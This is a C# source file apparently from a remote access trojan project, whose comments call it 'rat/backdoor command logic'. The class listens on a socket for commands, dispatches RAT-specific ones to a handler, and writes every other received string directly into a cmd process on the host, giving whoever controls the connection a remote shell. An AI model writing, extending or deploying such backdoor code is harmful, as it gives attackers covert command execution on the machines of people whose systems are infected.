using RAT.src.Interfaces;
using RAT.src.Models;
using System;
using System.Net.Sockets;
using System.Text;

namespace RAT.src.Logic.Sockets.Connection
{
    /// <summary>
    /// Handles client connection stage over socket.
    /// </summary>
    public class SocketConnectionReceiveLogic : ISocketConnectionReceiveLogic
    {
        private ISocketStateLogic _socketStateLogic { get; }
        private ISocketConnectionDisconnectLogic _socketConnectionDisconnectLogic { get; }
        private IRatCommandLogic _ratCommandLogic { get; }

        /// <summary>
        /// Handles client connection stage over socket.
        /// </summary>
        /// <param name="stateLogic">Our client state logic.</param>
        /// <param name="disconnectLogic">Disconnection logic for client.</param>
        /// <param name="ratCommandLogic">Our rat/backdoor command logic.</param>
        public SocketConnectionReceiveLogic(
            ISocketStateLogic stateLogic,
            ISocketConnectionDisconnectLogic disconnectLogic,
            IRatCommandLogic ratCommandLogic)
        {
            _socketStateLogic = stateLogic;
            _socketConnectionDisconnectLogic = disconnectLogic;
            _ratCommandLogic = ratCommandLogic;
        }

        /// <summary>
        /// Wrapper for initial command receive, any command receive starts from here.
        /// </summary>
        /// <param name="socket">Our connection.</param>
        public void BeginCommandReceive(Socket socket)
        {
            var clientState = _socketStateLogic.State;
            socket.BeginReceive(clientState.DataArray, 0, clientState.DataArray.Length, 0, OnCommandReceive, clientState);
        }

        /// <summary>
        /// Socket receival logic handling.
        /// </summary>
        /// <param name="res">Status of asynchronous operation.</param>
        private void OnCommandReceive(IAsyncResult res)
        {
            // Read data from the client socket.
            StateObject state = _socketStateLogic.GetStateFromAsyncResult(res);

            int bytesRead = 0;
            try
            {
                bytesRead = state.ClientSocket.EndReceive(res);
            }
            catch (SocketException)
            {
                // If some error occured during receival, then we are disconnecting client but preserving socket and connection,
                // so he could connect again immediately (in case if some error occured on his side).
                _socketConnectionDisconnectLogic.DisconnectFromMainSocket(state.ClientSocket);
                return;
            }

            // There might be more data, so store the data received so far.
            state.DataBuilder.Append(Encoding.ASCII.GetString(state.DataArray, 0, bytesRead));
            string content = state.DataBuilder.ToString();
            if (string.IsNullOrEmpty(content))
            {
                return;
            }

            // Check for end of command character (new line) in client command. If it is not there, read
            // more data.
            if (!content.Contains("\n") && content.Contains("<EOF>"))
            {
                // Not all data received. Get more.
                this.BeginCommandReceive(state.ClientSocket);
            }
            else
            {
                this.HandleClientRequest(state);
            }
        }

        /// <summary>
        /// Handles client request, which can contain command or something else (other non-command data, i.e file data).
        /// </summary>
        /// <param name="clientState">Current client state.</param>
        private void HandleClientRequest(StateObject clientState)
        {
            var potentialCommand = clientState.DataBuilder.ToString();

            // Check if this is RAT related command
            if (_ratCommandLogic.IsRatCommand(potentialCommand))
            {
                _ratCommandLogic.HandleRatCommand(potentialCommand);
            }
            else
            {
                // If this is not RAT command, then execute cmd command.
                clientState.ClientCmdProcess.StandardInput.WriteLine(
                    Encoding.Default.GetString(clientState.DataArray));
            }

            // Clear state data after command execution.
            clientState.DataBuilder.Clear(); // Command is stored here in string format.
            clientState.DataArray = new byte[1024]; // Command is stored here in byte command.

            // Continue on listening for other commands.
            this.BeginCommandReceive(clientState.ClientSocket);
        }
    }
}